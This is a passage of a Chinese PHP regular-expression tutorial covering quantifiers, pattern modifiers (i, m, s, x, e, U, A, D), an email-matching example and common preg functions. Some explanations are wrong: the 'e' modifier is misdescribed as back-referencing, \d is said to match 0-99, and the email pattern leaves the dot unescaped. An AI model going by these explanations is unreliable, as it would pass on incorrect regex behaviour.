<p>总结：<br>   1.匹配$string1成功而$string2不成功。<br>   2.因为\B后接的是this，所以this不能在词边界（空格和开始结尾）的位置出现。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>9. {m}有且只能出现m次</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;3&#125;酒/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝988酒&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝98811酒&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{3}我规定了0-9只能出现3次，多一次少一次都不行。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>10. {n,m} 可以出现n到m次</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;1,3&#125;酒/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝9酒&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝988酒&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{1,3}我规定了0-9只能出现1次，2次或者3次。其它次数都是错的</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>11. {m,} 至少m次，最大次数不限制</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;2,&#125;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝9&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝98&quot;</span>;</span><br><span class="line">//<span class="variable">$string3</span> = <span class="string">&quot;喝98122121&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{2,}我规定喝后面的0-9最少出现两次，最多次数不限。因此$string1是匹配不成功的，$string2是匹配成功的。$string3是匹配成功的。</p>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="6-模式修正符"><a href="#6-模式修正符" class="headerlink" title="6. 模式修正符"></a><font face="Comic sans MS"><font color="#FF6347">6. 模式修正符</font></h3><p><font face="Comic sans MS">我们通过元字符和原子完成了正则表达示的入门。有一些特殊情况我们依然需要来处理。<br>如果abc在第二行的开始处如何匹配？<br><font color="red">我不希望正则表达示特别贪婪的匹配全部，只匹配一部份怎么办？</font><br>这个时候，我们就需要用到下面的这些模式匹配来增强正则的功能。</p>
<p><font color="#00B2EE"><strong>常用的模式匹配符有：</strong></font><br></font></p>
<table>
<thead>
<tr>
<th align="center">模式匹配符</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td align="left">模式中的字符将同时匹配大小写字母.</td>
</tr>
<tr>
<td align="center">m</td>
<td align="left">字符串视为多行</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">将字符串视为单行,换行符作为普通字符.</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">将模式中的空白忽略.</td>
</tr>
<tr>
<td align="center">A</td>
<td align="left">强制仅从目标字符串的开头开始匹配.</td>
</tr>
<tr>
<td align="center">D</td>
<td align="left">模式中的美元元字符仅匹配目标字符串的结尾.</td>
</tr>
<tr>
<td align="center">U</td>
<td align="left">匹配最近的字符串.</td>
</tr>
</tbody></table>
<p><font face="Comic sans MS">模式匹配符的用法如下：<font color="red"><strong>&#x2F; 正则表达示&#x2F;模式匹配符</strong></font> &amp;emsp;   <font color="#00B2EE">模式匹配符是放在正则表达式的最后的。</font><br></font>例如： &#x2F;\w+&#x2F;<font color="red"><strong>s</strong></font> </p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. i 不区分大小写</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php //在后面加上了一个i </span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/ABC/i&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;8988abc12313&#x27;</span>;</span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;11111ABC2222&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>; </span><br><span class="line">    var_dump(<span class="variable">$matches</span>); &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论，不论是$string还是$string1全都匹配成功了。因此，在后面加上了i之后，能够不共分匹配内容的大小写。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. m 视为多行</strong></font><br></font><font color="red">正则在匹配的时候，要匹配的目标字符串我们通常视为一行。</font><br><font color="#00B2EE"><strong>“行起始”元字符（^）</strong></font>仅仅匹配字符串的起始，<font color="#00B2EE"><strong>“行结束”元字符（$）</strong></font>仅仅匹配字符串的结束。<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。<br><font color="red"><strong>注意：</strong></font><strong>如果要匹配的字符串中没有“\n”字符或者模式中没有 ^ 或 $，则设定此修正符没有任何效果。</strong></p>
<p>我们通过实验和代码来验证一下这个特点：<br>第一次匹配，你会发现匹配不成功：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^a\d+/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;我的未来在自己手中我需要不断的努力</span></span><br><span class="line"><span class="string">a9是一个不错的字符表示</span></span><br><span class="line"><span class="string">怎么办呢，其实需要不断奋进&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">    var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>第二次匹配，我们加上m 试试：<font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^a\d+/m&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;我的未来在自己手中我需要不断的努力</span></span><br><span class="line"><span class="string">a9是一个不错的字符表示</span></span><br><span class="line"><span class="string">怎么办呢，其实需要不断奋进&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">    var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(2) <span class="string">&quot;a9&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>哦耶！匹配成功了。&#x2F;^a\d+&#x2F; 匹配的内容是a9，必须得在行开始处。在第二行也被匹配成功了。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. s 视为一行</strong></font><br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。<br></font><br>第一次，不加模式匹配符s：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/新的未来.+\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;新的未来</span></span><br><span class="line"><span class="string">987654321&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>第二次，在正则表达示后面加上模式匹配符s:<font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/新的未来.+\d+/s&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;新的未来</span></span><br><span class="line"><span class="string">987654321&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(22) <span class="string">&quot;新的未来 987654321&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：</p>
</blockquote>
<ol>
<li>因为在新的未来，未来后面有一个换行</li>
<li>而.(点)是匹配非空白字符以外的所有字符。因此，第一次不成功</li>
<li>第二次，加上了s模式匹配符。因为，加上后.（点）能匹配所有字符。</li>
</ol>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. x 忽略空白字符</strong></font></p>
<ol>
<li>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略。</li>
<li>未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。</font></li>
</ol>
<ul>
<li><font color="#FF6347">(1)↓↓</font>我们先来实验一下忽略空白行等特性：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a b c /x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;学英语要从abc开始&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(3) <span class="string">&quot;abc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这样也能匹配成功。<br>在$pattern里面有空格，每个abc后面有一个空格。而$string里面没有空格。<br>所以x忽略空白字符。</p>
</blockquote>
<ul>
<li><font color="#FF6347">(2)↓↓</font>而第二句话从字面上比较难理解：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//重点观察这一行</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a b c #我来写一个注释</span></span><br><span class="line"><span class="string">/x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;学英语要从abc开始&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(3) <span class="string">&quot;abc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果也匹配成功了！<br>我们发现，<font color="red">x的第二个特性是忽略：#字符和下一个换行符之间的字符也被忽略</font>。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. e 将匹配项找出来，进行替换</strong></font><br>e模式也叫逆向引用。主要的功能是将正则表达式括号里的内容取出来，放到替换项里面替换原字符串。<br>使用这个模式匹配符前必须要使用到<font color="#00B2EE"><strong>preg_replace()</strong></font>。<br><font color="red"><strong>mixed preg_replace ( mixed $正则表达式 , mixed $用于取代字符串的字串 , mixed $目标字符串)</strong></font><br><strong>preg_replace的功能：</strong>使用正则表达式 ，找到目标字符串。然后用’用于取代字符串的字串’进行替换。<br></font></p>
<p>在正式讲解前我们回顾一下之前的知识，我们故意的把每个要匹配的原子外面都加上括号：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//加上了括号</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\d+)([a-z]+)(\d+)/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;987abc321&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(4) &#123; [0]=&gt; string(9) <span class="string">&quot;987abc321&quot;</span> [1]=&gt; string(3) <span class="string">&quot;987&quot;</span> [2]=&gt; string(3) <span class="string">&quot;abc&quot;</span> [3]=&gt; string(3) <span class="string">&quot;321&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这是我们之前讲括号的时候：匹配到的内容外面有括号。会把括号里面的内容，也放到数组的元素里面。如图中的：987、abc、321。</p>
</blockquote>
<p>&amp;emsp;<br>我们接下来看正则表达示中的e模式：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&#123;April 15, 2003&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="string">&#x27;w&#x27;</span>匹配字母，数字和下划线，<span class="string">&#x27;d&#x27;</span>匹配0-99数字，<span class="string">&#x27;+&#x27;</span>元字符规定其前导字符必须在目标对象中连续出现一次或多次</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/&#123;(\w+) (\d+), (\d+)&#125;/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&quot;\$2&quot;</span>;</span><br><span class="line"></span><br><span class="line">//字符串被替换为与第 n 个被捕获的括号内的子模式所匹配的文本</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">15</span><br></pre></td></tr></table></figure>

<blockquote>
</blockquote>
<p>结论：</p>
<ol>
<li>上例中$2 指向的是正则表达示的第一个(\d+)。相当于把15又取出来了</li>
<li>替换的时候，我写上$2。将匹配项取出来，用来再次替换匹配的结果。</li>
</ol>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. U 贪婪模式控制</strong></font><br>正则表达式默认是贪婪的，也就是尽可能的最大限度匹配。<br></font></p>
<p>我们来看看正则表达示是如何贪婪的：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;div&gt;.*&lt;\/div&gt;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&lt;div&gt;你好&lt;/div&gt;&lt;div&gt;我是&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(34) <span class="string">&quot;</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">我是</span></span><br><span class="line"><span class="string">&quot;</span> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们来看看结果，得到如下结论。它从“<br>你好”直接匹配到了“我是<br>”。进行了最大范围的匹配。</p>
</blockquote>
<p>&amp;emsp;<br>同样一段代码我们再加大写的U，再看看效果：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;div&gt;.*&lt;\/div&gt;/U&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&lt;div&gt;你好&lt;/div&gt;&lt;div&gt;我是&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(17) <span class="string">&quot;</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们发现，只匹配出来了：&lt;div&gt;你好&lt;&#x2F;div&gt;<br>这样，把正则的贪婪特性取消掉。让它找到了最近的匹配，就OK了。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. A 从目标字符串的开头开始匹配</strong></font><br>此模式类似于元字符中的^（抑扬符）效果。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/this/A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;hello this is a &#x27;</span>;</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&#x27;this is a &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>   1.如果加A模式修正符的时候匹配不出来$string，不加时能匹配出来<br>   2.如果加上了A模式修正符的时候能匹配出来$string1,因为必须要从开始处开始匹配</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. D 结束$符后不准有回车</strong></font><br>如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\w+this$/&#x27;</span>; </span><br><span class="line"><span class="variable">$pattern1</span> = <span class="string">&#x27;/\w+this$/D&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;hellothis &quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern1</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>; </span><br><span class="line">var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>1.如pattern 在匹配$string的时候，$string的字符串this后有一个回车。在没有加D匹配符的时候也能匹配成功<br>2.如pattern 在匹配$string的时候，加上了D。$string的字符串this后有空格，匹配不成功。</p>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="7-写正则的诀窍和常用正则"><a href="#7-写正则的诀窍和常用正则" class="headerlink" title="7. 写正则的诀窍和常用正则"></a><font face="Comic sans MS"  color="#FF6347">7. 写正则的诀窍和常用正则</font></h3><p><font face="Comic sans MS">写正则的诀窍</font><br>女孩和男孩恋爱时的诀窍通常是：测试你是不是对我好一点，如果是的，咱们的关系就更好一点。<br>而正则的诀窍和恋爱的诀窍基本一致：<font color="red">写一点、测一点。</font><br>因为，<strong>我们需要不断的正则，用preg_match对比是不是能匹配成功。成功了，再写后面的一点。直到写完，全部匹配成功为止！</strong><br><font face="Comic sans MS">例如，我要写一个邮箱的正则。我先要做的事情，将常用的邮箱格式全部列出来。例如：<br><a href="mailto:&#x70;&#104;&#112;&#99;&#110;&#x40;&#x70;&#104;&#112;&#x2e;&#x63;&#x6e;">&#x70;&#104;&#112;&#99;&#110;&#x40;&#x70;&#104;&#112;&#x2e;&#x63;&#x6e;</a> &amp;emsp; <a href="mailto:&#112;&#x68;&#x70;&#99;&#x6e;&#x40;&#99;&#111;&#114;&#112;&#x2e;&#x62;&#x61;&#x69;&#x64;&#117;&#x2e;&#x63;&#x6d;">&#112;&#x68;&#x70;&#99;&#x6e;&#x40;&#99;&#111;&#114;&#112;&#x2e;&#x62;&#x61;&#x69;&#x64;&#117;&#x2e;&#x63;&#x6d;</a> &amp;emsp; <a href="mailto:&#x70;&#104;&#x70;&#99;&#110;&#64;&#x31;&#50;&#x36;&#x2e;&#x63;&#x6f;&#x6d;">&#x70;&#104;&#x70;&#99;&#110;&#64;&#x31;&#50;&#x36;&#x2e;&#x63;&#x6f;&#x6d;</a>  &amp;emsp;<a href="mailto:&#112;&#104;&#x70;&#99;&#x6e;&#x40;&#x78;&#120;&#120;&#x2e;&#x63;&#111;&#109;">&#112;&#104;&#x70;&#99;&#x6e;&#x40;&#x78;&#120;&#120;&#x2e;&#x63;&#111;&#109;</a>  &amp;emsp;<a href="mailto:&#49;&#50;&#51;&#52;&#x35;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;">&#49;&#50;&#51;&#52;&#x35;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;</a><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">  常用的格式主要有这样一些。那我们就可以来分析：
    1.先匹配@之前的字符 \w+（因为是0-9A-Za-z_）
    2.第二个跟一个@符
    3.第三个再写上[a-zA-Z0-9-]+ 因为qq和126这些主域名是不能有下划线的
    4.corp.baidu. 或者是126. 通常邮箱后缀都是这样的。所以我们可以写成：([a-zA-Z0-9-]+.){1,2}
    5.上面的是将 **.** 转义，让它是本身的意思。括号重复的区间最少一次，最多两次。
    6.后面接下com|cn|org|gov.cn|net|edu.cn等就可以了
</font></td></tr></table>

<p>因此，我们的正则表达式我使用：<br>&#x2F;\w+@([a-zA-Z0-9-]+.){1,2}(com|cn|org|gov.cn|net|edu.cn)&#x2F;<br>或<br>&#x2F;\w+@([a-zA-Z0-9_]+)\.(com|cn|org|gov.cn|net|edu.cn)&#x2F;<br>邮箱的正则就被我写成功了。ฅʕ•̫͡•ʔฅ</p>
<p>&amp;emsp;</p>
<h3 id="8-常用正则函数"><a href="#8-常用正则函数" class="headerlink" title="8. 常用正则函数"></a><font face="Comic sans MS" color="#FF6347">8. 常用正则函数</font></h3><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">preg_filter</td>
<td align="left">执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td align="center">preg_grep</td>
<td align="left">返回匹配模式的数组条目</td>
</tr>
<tr>
<td align="center">preg_match</td>
<td align="left">执行一个正则表达式匹配</td>
</tr>
<tr>
<td align="center">preg_match_all</td>
<td align="left">执行一个全局正则表达式匹配</td>
</tr>
<tr>
<td align="center">preg_replace_callback_array</td>
